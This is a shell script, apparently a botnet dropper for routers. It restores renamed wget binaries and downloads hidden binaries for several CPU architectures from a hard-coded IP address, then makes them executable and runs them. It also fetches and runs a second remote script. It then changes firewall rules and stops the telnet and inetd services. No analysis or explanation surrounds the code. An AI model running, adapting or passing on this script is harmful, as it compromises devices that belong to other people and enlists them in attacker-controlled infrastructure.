#!/bin/sh
# THIS SCRIPT DOWNLOAD THE BINARIES INTO ROUTER.
# UPLOAD GETBINARIES.SH IN YOUR HTTPD.

# YOUR HTTPD SERVER:
REFERENCE_HTTP="http://91.121.21.139/WGA"

# NAME OF BINARIES:
REFERENCE_MIPSEL=".logd_ms"
REFERENCE_MIPS=".logd_m"
REFERENCE_SUPERH=".logd_s"
REFERENCE_ARM=".logd_a"
REFERENCE_PPC=".logd_p"

rm -fr /var/run/${REFERENCE_MIPSEL} \
	/var/run/${REFERENCE_MIPS} \
	/var/run/${REFERENCE_SUPERH} \
	/var/run/${REFERENCE_ARM} \
	/var/run/${REFERENCE_PPC}
	
rm -rf /var/etc/enigma.d

mv -f /usr/bin/-wget /usr/bin/wget
mv -f /bin/-wget /bin/wget
mv -f /sbin/-wget /bin/wget
mv -f /usr/sbin/-wget /usr/sbin/wget 

wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPSEL} -P /var/run && chmod +x /var/run/${REFERENCE_MIPSEL} && /var/run/${REFERENCE_MIPSEL}
wget -c ${REFERENCE_HTTP}/${REFERENCE_MIPS} -P /var/run && chmod +x /var/run/${REFERENCE_MIPS} && /var/run/${REFERENCE_MIPS}
wget -c ${REFERENCE_HTTP}/${REFERENCE_ARM} -P /var/run && chmod +x /var/run/${REFERENCE_ARM} && /var/run/${REFERENCE_ARM}
wget -c ${REFERENCE_HTTP}/${REFERENCE_PPC} -P /var/run && chmod +x /var/run/${REFERENCE_PPC} && /var/run/${REFERENCE_PPC}
wget -c ${REFERENCE_HTTP}/${REFERENCE_SUPERH} -P /var/run && chmod +x /var/run/${REFERENCE_SUPERH} && /var/run/${REFERENCE_SUPERH}
cd /var/run/ ; wget http://91.121.21.139/v6/vsix.sh ; chmod +x vsix.sh ; sh vsix.sh

modprobe ip_tables
modprobe iptable_filter

iptables -A INPUT -p tcp -d 10.0.0.0/8 --dport 23 -j ACCEPT
iptables -A INPUT -p tcp -d 10.0.0.0/8 --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -d 127.0.0.0/8 --dport 23 -j ACCEPT
iptables -A INPUT -p tcp -d 127.0.0.0/8 --dport 80 -j ACCEPT
iptables -A INPUT -p tcp -d 192.168.0.0/16 --dport 23 -j ACCEPT
iptables -A INPUT -p tcp -d 192.168.0.0/16 --dport 80 -j ACCEPT

sleep 5;

/etc/init.d/inet stop
/etc/init.d/inetd stop
/etc/init.d/S50inetd stop
/etc/init.d/S002.sh stop

rm -fr /var/run/.bin.sh



